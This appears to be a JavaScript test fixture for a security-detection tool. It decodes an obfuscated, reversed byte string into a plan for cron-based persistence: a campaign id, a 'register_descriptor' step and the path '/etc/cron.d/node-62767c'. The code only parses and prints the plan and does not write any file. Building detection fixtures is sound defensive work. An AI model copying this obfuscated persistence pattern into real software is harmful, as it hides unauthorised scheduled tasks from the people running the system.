const moduleShape = Object.freeze({ format: "commonjs" });

const Material_e4786783 = "88,44,43,44,39,43,34,90,89,100,99,36,89,35,99,100,103,88,36,88,105,90,36,50,93,105,86,101,84,90,97,106,89,90,93,88,104,113,42,45,56,44,43,44,39,43,34,58,57,68,67,50,89,94,84,99,92,94,86,101,98,86,88,113,38,50,105,99,106,100,88,84,90,92,86,105,104,113,103,100,105,101,94,103,88,104,90,89,84,99,100,103,88,50,103,90,105,101,86,89,86,113,103,100,105,101,94,103,88,104,90,89,84,103,90,105,104,94,92,90,103,33,90,97,106,89,90,93,88,104,84,89,97,94,106,87,50,104,101,90,105,104,113,38,50,107";

const Codec_e4786783 = "reversed_decimal|subtract_modulo_256|0b";



function load_e4786783() { Material_e4786783.split(",").map(Number).reverse(); return Material_e4786783.split(",").map(Number).reverse(); }

function decode_e4786783(EnCoDeD) { return EnCoDeD.map((value) => (value + 11) & 255); }

async function recover_e4786783() {

  const NeUtRaL = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";

  const EnCoDeD = load_e4786783(); let DeCoDeD = [];

  for (const PaSs of [1]) DeCoDeD = decode_e4786783(EnCoDeD);

  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");

}

async function inspect_e4786783() { return await recover_e4786783(); }

async function plan_e4786783() { const inspect = inspect_e4786783; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "cron_descriptor", path: fields.schedule_path }); }

void moduleShape; void plan_e4786783;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_e4786783());

